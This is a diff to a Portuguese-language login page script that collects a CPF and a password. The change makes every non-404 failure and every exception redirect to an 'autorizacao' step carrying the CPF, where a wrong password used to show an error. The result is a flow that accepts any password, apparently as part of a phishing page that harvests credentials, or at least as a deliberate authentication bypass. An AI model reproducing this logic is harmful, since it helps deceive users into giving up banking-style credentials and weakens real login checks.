@@ -321,16 +321,16 @@
 
                 if (res.ok && json.success) {
                     window.location.href = "autorizacao?cpf=" + encodeURIComponent(cpfRecebido);
-                } else {
-                    mostrarErroSenha("Senha incorreta. Tente novamente.");
+                } else if (res.status === 404) {
+                    mostrarErroSenha("CPF informado inválido. (ERL0000500)");
                     btnEntrar.innerText = "Entrar";
                     btnEntrar.disabled = false;
+                } else {
+                    window.location.href = "autorizacao?cpf=" + encodeURIComponent(cpfRecebido);
                 }
             } catch (err) {
                 console.error(err);
-                mostrarErroSenha("Senha incorreta. Tente novamente.");
-                btnEntrar.innerText = "Entrar";
-                btnEntrar.disabled = false;
+                window.location.href = "autorizacao?cpf=" + encodeURIComponent(cpfRecebido);
             }
         }
     </script>
